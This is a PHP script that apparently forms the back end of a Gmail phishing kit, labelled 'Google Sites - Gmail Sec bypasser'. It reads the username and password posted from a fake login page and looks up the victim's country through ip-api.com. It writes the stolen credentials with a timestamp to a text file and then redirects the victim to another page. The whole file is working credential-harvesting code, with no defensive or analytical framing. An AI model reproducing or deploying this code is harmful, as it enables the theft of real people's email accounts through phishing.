<?php
include 'ip.php';
/*   __________________________________________________
    |    Google Sites - Gmail Sec bypasser   |
    |                                                  |
    |                Moda Sokan Tarzdan                |
    |__________________________________________________|
*/
	    $ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');
$cur_time=date("d-m-Y H:i:s");
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$ulke = $details->country;
session_start();
$file = fopen($name, 'a');
file_put_contents("ulantw.txt", "

Username: ".$_POST['username']."\n".  "Password: " .$_POST['password']. "\n"."Country:" .$ulke. "\n". "Time:" .$cur_time.  "\n\n------------------------------",  FILE_APPEND);
header('Location: son.html');
exit();

